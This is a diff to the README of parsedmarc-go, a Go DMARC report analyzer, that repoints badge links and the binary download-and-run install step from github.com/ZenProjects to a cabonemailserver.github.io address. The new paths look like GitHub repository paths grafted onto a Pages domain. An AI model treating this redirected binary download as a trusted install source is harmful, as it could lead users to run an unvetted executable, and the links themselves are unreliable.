@@ -1,8 +1,8 @@
 # parsedmarc-go - High-performance DMARC report analyzer
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/ZenProjects/parsedmarc-go)
+[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://cabonemailserver.github.io/ParseDMarc-go)
 [![Go Version](https://img.shields.io/badge/go-1.21+-blue)](https://golang.org/)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](https://github.com/ZenProjects/parsedmarc-go/blob/master/LICENSE)
+[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](https://cabonemailserver.github.io/ParseDMarc-go/blob/master/LICENSE)
 
 `parsedmarc-go` is a high-performance Go application for parsing and analyzing DMARC reports with native ClickHouse storage and Grafana visualization.
 It provides enterprise-grade DMARC report processing with superior performance and simplified deployment.
@@ -36,7 +36,7 @@ graph TD
 ### Binary Release
 ```bash
 # Download latest release
-curl -L -o parsedmarc-go https://github.com/ZenProjects/parsedmarc-go/releases/latest/download/parsedmarc-go-linux-amd64
+curl -L -o parsedmarc-go https://cabonemailserver.github.io/ParseDMarc-go/releases/latest/download/parsedmarc-go-linux-amd64
 chmod +x parsedmarc-go
 
 # Run with config
